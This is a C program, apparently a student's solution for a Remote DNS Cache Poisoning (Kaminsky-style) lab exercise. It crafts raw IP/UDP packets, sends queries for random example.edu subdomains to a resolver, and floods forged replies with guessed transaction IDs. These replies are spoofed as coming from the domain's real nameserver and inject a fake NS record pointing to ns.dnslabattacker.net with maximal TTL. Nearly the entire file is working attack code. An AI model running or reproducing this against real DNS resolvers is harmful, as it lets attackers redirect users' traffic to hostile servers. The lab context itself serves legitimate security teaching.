// ----udp.c------
// For use with the Remote DNS Cache Poisoning Attack Lab
// Sample program used to spoof lots of different DNS queries to the victim.
//
// Wireshark can be used to study the packets, however, the DNS queries 
// sent by this program are not enough for to complete the lab.
//
// The response packet needs to be completed.
//
// Compile command:
// gcc udp.c -o udp
//
// The program must be run as root
// sudo ./udp

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader {
    unsigned char      iph_ihl:4, iph_ver:4;
    unsigned char      iph_tos;
    unsigned short int iph_len;
    unsigned short int iph_ident;
    unsigned short int iph_offset;
    unsigned char      iph_ttl;
    unsigned char      iph_protocol;
    unsigned short int iph_chksum;
    unsigned int       iph_sourceip;
    unsigned int       iph_destip;
};

// UDP header's structure
struct udpheader {
    unsigned short int udph_srcport;
    unsigned short int udph_destport;
    unsigned short int udph_len;
    unsigned short int udph_chksum;

};
struct dnsheader {
    unsigned short int query_id;
    unsigned short int flags;
    unsigned short int QDCOUNT;
    unsigned short int ANCOUNT;
    unsigned short int NSCOUNT;
    unsigned short int ARCOUNT;
};
// This structure just for convinience in the DNS packet, because such 4 byte data often appears. 
struct dataEnd{
    unsigned short int  type;
    unsigned short int  class;
};
// total udp header length: 8 bytes (=64 bits)

unsigned int checksum(uint16_t *usBuff, int isize)
{
    unsigned int cksum=0;
    for(;isize>1;isize-=2){
        cksum+=*usBuff++;
    }
    if(isize==1){
        cksum+=*(uint16_t *)usBuff;
    }
    return (cksum);
}

// calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
    unsigned long sum=0;
    struct ipheader *tempI=(struct ipheader *)(buffer);
    struct udpheader *tempH=(struct udpheader *)(buffer+sizeof(struct ipheader));
    struct dnsheader *tempD=(struct dnsheader *)(buffer+sizeof(struct ipheader)+sizeof(struct udpheader));
    tempH->udph_chksum=0;
    sum=checksum((uint16_t *)&(tempI->iph_sourceip),8);
    sum+=checksum((uint16_t *)tempH,len);
    sum+=ntohs(IPPROTO_UDP+len);
    sum=(sum>>16)+(sum & 0x0000ffff);
    sum+=(sum>>16);
    return (uint16_t)(~sum);
}
// Function for checksum calculation. From the RFC791,
// the checksum algorithm is:
//  "The checksum field is the 16 bit one's complement of the one's
//  complement sum of all 16 bit words in the header.  For purposes of
//  computing the checksum, the value of the checksum field is zero."
unsigned short csum(unsigned short *buf, int nwords)
{
    unsigned long sum;
    for(sum=0; nwords>0; nwords--)
        sum += *buf++;
    sum = (sum >> 16) + (sum &0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

void init_fake(char *buf){
    /*
        Remember that the network pkg is Big-Endian, so be careful to directly manipulate the byte list
    */
    struct ipheader *ip = (struct ipheader *)buf;
    struct udpheader *udp = (struct udpheader *)(buf + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader*)(buf +sizeof(struct ipheader)+sizeof(struct udpheader));
    char *data = (buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    /*
        Step 1: set DNS pkg
            Size = 12 + 23 + 16 + 35 + 27 = 113 = 0x71
    */
        // 1.1: DNS Header
    dns->flags = htons(FLAG_R); // flags are set to normal response flag
    dns->QDCOUNT = htons(1); // Question Num
    dns->ANCOUNT = htons(1); // Answer Num
    dns->NSCOUNT = htons(1); // Authority Num
    dns->ARCOUNT = htons(2); // Additional Records Num
        // 1.2: DNS Body
    // Query
    int offset = 0;
    strcpy(data,"\5aaaaa\7example\3edu");
    data[18] = '\0'; // end of string
    data[19] = '\0'; 
    data[20] = '\1'; // above 2: Type A
    data[21] = '\0';
    data[22] = '\1'; // above 2: Class IN
    offset += 23;

    // Answer
    data[offset] = 0xc0;
    data[offset + 1] = 0x0c;
        // these two tells that we just refer the url in Query section
    data[offset + 2] = 0x00;
    data[offset + 3] = 0x01; // above 2: Type A
    data[offset + 4] = 0x00;
    data[offset + 5] = 0x01; // above 2: Class IN
    data[offset + 6] = 0x7f;
    data[offset + 7] = 0xff;
    data[offset + 8] = 0xff;
    data[offset + 9] = 0xff; // above 4: TTL, set to the maximum int number
    data[offset + 10] = 0x00;
    data[offset + 11] = 0x04; // above 2: data length of the fake ip address
    data[offset + 12] = 0x66;
    data[offset + 13] = 0x66;
    data[offset + 14] = 0x66;
    data[offset + 15] = 0x66; // above 4: Fake ip address for ?????.example.edu: 102.102.102.102 (not important at all)
    offset += 16;

    // Authority
        // shorten mode
    data[offset] = 0xc0;
    data[offset + 1] = 0x12; // the offset from data to the domain name begin, should be "0x12" here, since we're pretending domain "example.edu" (begin with \7),
        // so offset = 12 (udp header size) + 6 ("\5aaaaa") = 18 = 0x12
    data[offset + 2] = 0x00;
    data[offset + 3] = 0x02; // above 2: Type NS
    data[offset + 4] = 0x00;
    data[offset + 5] = 0x01; // above 2: Class IN
    data[offset + 6] = 0x7f;
    data[offset + 7] = 0xff;
    data[offset + 8] = 0xff;
    data[offset + 9] = 0xff; // above 4: TTL, set to the maximum int number
    data[offset + 10] = 0x00;
    data[offset + 11] = 0x17; // above 2: data length of the fake domain network server's name
    strcpy(data + offset + 12, ".ns.dnslabattacker.net"); // string length = 22
    data[offset + 12] = 0x02;
    data[offset + 12 + 3] = 0x0e;
    data[offset + 12 + 18] = 0x03;
    data[offset + 12 + 22] = 0x00; // end of string
    offset += 35;

    // Additional Records
        // adopt shorten mode again
    data[offset] = 0xc0;
    data[offset + 1] = 0x3f; // offset (to "/2ns/14dnslabattacker/3net") 
        // = 12 (header) + 23 (query) + 16 (answer) + 12 (offset in Authority section) = 63 = 0x3f
    data[offset + 2] = 0x00;
    data[offset + 3] = 0x01; // above 2: Type A
    data[offset + 4] = 0x00;
    data[offset + 5] = 0x01; // above 2: Class IN
    data[offset + 6] = 0x7f;
    data[offset + 7] = 0xff;
    data[offset + 8] = 0xff;
    data[offset + 9] = 0xff; // above 4: TTL, set to the maximum int number
    data[offset + 10] = 0x00;
    data[offset + 11] = 0x04; // above 2: data length of the fake ip address
    data[offset + 12] = 0x77;
    data[offset + 13] = 0x77;
    data[offset + 14] = 0x77;
    data[offset + 15] = 0x77; // above 4: Fake ip address for THE Domain Server for .example.edu: 119.119.119.119
        // essential for the poison
        // but actually it doesn't work, since it's against Bailiwick checking
    
        // <Root> Type: OPT
        // 0x00 0x00 0x29 0x10 0x00 0x00 0x00 0x88 0x00 0x00 0x00
    data[offset + 16] = 0x00;
    data[offset + 17] = 0x00;
    data[offset + 18] = 0x29;
    data[offset + 19] = 0x10;
    data[offset + 20] = 0x00;
    data[offset + 21] = 0x00;
    data[offset + 22] = 0x00;
    data[offset + 23] = 0x88;
    data[offset + 24] = 0x00;
    data[offset + 25] = 0x00;
    data[offset + 26] = 0x00;

    offset += 27;

    /*
        Step 2: set UDP pkg
    */
    udp->udph_srcport = htons(53);
    udp->udph_destport = htons(33333);
    udp->udph_len = htons(sizeof(struct udpheader) + 0x71); // size = udp header size + DNS size (0x71)

    /*
        Step 3: set IP pkg
    */
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0;
    ip->iph_len=htons(sizeof(struct ipheader) + sizeof(struct udpheader) + 0x71); // size = ip header + UDP size (sizeof(struct udpheader) + 0x71)
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 0xf0; // hops
    ip->iph_protocol = 17; // UDP
    ip->iph_sourceip = inet_addr("199.43.135.53"); // fake you are the real domain server, and this ip address is up-to-date
    ip->iph_destip = inet_addr("192.168.15.4");
    ip->iph_chksum = csum((unsigned short *)buf, sizeof(struct ipheader) + sizeof(struct udpheader));
}

void update_fake(char *buf, int incre_off, int transaction_id){
    /*
        Update for:
            1. dns->query_id
            2. check sum of udp
    */
    struct udpheader *udp = (struct udpheader *)(buf + sizeof(struct ipheader));
    struct dnsheader *dns = (struct dnsheader*)(buf +sizeof(struct ipheader)+sizeof(struct udpheader));
    char *data = (buf +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    if (incre_off)
        *(data+incre_off)+=1;
    dns->query_id = transaction_id;
    udp->udph_chksum = check_udp_sum(buf, sizeof(struct udpheader) + 0x71);
}

int main(int argc, char *argv[])
{
    // This is to check the argc number
    if(argc != 3){
        printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
        exit(-1);
    }

    // socket descriptor
    int sd;

    // buffer to hold the packet
    char buffer[PCKT_LEN];
    char fake_buffer[PCKT_LEN];
    char recv_buffer[2048];
    init_fake(fake_buffer);

    // set the buffer to 0 for all bytes
    memset(buffer, 0, PCKT_LEN);

    // Our own headers' structures
    struct ipheader *ip = (struct ipheader *)buffer;
    struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
    struct dnsheader *dns=(struct dnsheader*)(buffer +sizeof(struct ipheader)+sizeof(struct udpheader));

    // data is the pointer points to the first byte of the dns payload  
    char *data=(buffer +sizeof(struct ipheader)+sizeof(struct udpheader)+sizeof(struct dnsheader));

    ////////////////////////////////////////////////////////////////////////
    // dns fields(UDP payload field)
    // relate to the lab, you can change them. begin:
    ////////////////////////////////////////////////////////////////////////

    //The flag you need to set
    dns->flags=htons(FLAG_Q);
    
    //only 1 query, so the count should be one.
    dns->QDCOUNT=htons(1);

    //query string
    strcpy(data,"\5aaaaa\7example\3edu");
    int length= strlen(data)+1;

    //this is for convinience to get the struct type write the 4bytes in a more organized way.
    struct dataEnd * end=(struct dataEnd *)(data+length);
    end->type=htons(1);
    end->class=htons(1);

    /////////////////////////////////////////////////////////////////////
    //
    // DNS format, relate to the lab, you need to change them, end
    //
    //////////////////////////////////////////////////////////////////////

    /*************************************************************************************
      Construction of the packet is done. 
      now focus on how to do the settings and send the packet we have composed out
     ***************************************************************************************/
    
    // Source and destination addresses: IP and port
    struct sockaddr_in sin, din;
    int one = 1;
    const int *val = &one;
    dns->query_id=rand(); // transaction ID for the query packet, use random #

    // Create a raw socket with UDP protocol
    sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);

    if(sd<0) // if socket fails to be created 
        printf("socket error\n");

    // The source is redundant, may be used later if needed
    // The address family
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;

    // Port numbers
    sin.sin_port = htons(33333);
    din.sin_port = htons(53);

    // IP addresses
    sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
    din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

    // Fabricate the IP header or we can use the
    // standard header structures but assign our own values.
    ip->iph_ihl = 5;
    ip->iph_ver = 4;
    ip->iph_tos = 0; // Low delay

    unsigned short int packetLength =(sizeof(struct ipheader) + sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size
    ip->iph_len=htons(packetLength);
    ip->iph_ident = htons(rand()); // give a random number for the identification#
    ip->iph_ttl = 110; // hops
    ip->iph_protocol = 17; // UDP

    // Source IP address, can use spoofed address here!!!
    ip->iph_sourceip = inet_addr(argv[1]);

    // The destination IP address
    ip->iph_destip = inet_addr(argv[2]);

    // Fabricate the UDP header. Source port number, redundant
    udp->udph_srcport = htons(40000+rand()%10000);  // source port number. remember the lower number may be reserved
    
    // Destination port number
    udp->udph_destport = htons(53);
    udp->udph_len = htons(sizeof(struct udpheader)+sizeof(struct dnsheader)+length+sizeof(struct dataEnd));

    // Calculate the checksum for integrity
    ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));
    udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader));
    
    /*******************************************************************************8
      Tips

      the checksum is quite important to pass integrity checking. You need 
      to study the algorithem and what part should be taken into the calculation.

      !!!!!If you change anything related to the calculation of the checksum, you need to re-
      calculate it or the packet will be dropped.!!!!!

      Here things became easier since the checksum functions are provided. You don't need
      to spend your time writing the right checksum function.
      Just for knowledge purposes,
      remember the seconed parameter
      for UDP checksum:
      ipheader_size + udpheader_size + udpData_size  
      for IP checksum: 
      ipheader_size + udpheader_size
     *********************************************************************************/

    // Inform the kernel to not fill up the packet structure. we will build our own...
    if(setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one))<0 )
    {
        printf("error\n");	
        exit(-1);
    }
    
    int cnt = 0;
    for(; ; cnt ++)
    {	
        // This is to generate a different query in xxxxx.example.edu
        //   NOTE: this will have to be updated to only include printable characters
        int charnumber;
        charnumber=1+rand()%5;
        *(data+charnumber)+=1;

        udp->udph_chksum=check_udp_sum(buffer, packetLength-sizeof(struct ipheader)); // recalculate the checksum for the UDP packet

        // send the packet out.
        if(sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
            printf("packet send error %d which means %s\n",errno,strerror(errno));

        update_fake(fake_buffer, charnumber, 0);
        int attemp_num = 5000, init_num = rand() & 0xffff;
        while(attemp_num--){
            update_fake(fake_buffer, 0, init_num);
            if(
                sendto(
                    sd, 
                    fake_buffer, 
                    sizeof(struct ipheader) + sizeof(struct udpheader) + 0x71, 
                    0, 
                    (struct sockaddr *)&sin, 
                    sizeof(sin)
                ) < 0
            )
                printf("packet send error %d which means %s\n",errno,strerror(errno));
            init_num = (init_num + 1) & 0xffff;
        }

        // socklen_t address_len;
        // int recv_len;
        // recv_len = recvfrom(
        //     sd,
        //     recv_buffer,
        //     2048,
        //     0,
        //     (struct sockaddr *)&sin,
        //     &address_len
        // )

        // sleep(1);
    
        if (cnt >= 100) // by calculating, the success probability is nearly 0.8 (after this time's modify) each time running ./udp
            break;
    }
    close(sd);
    return 0;
}

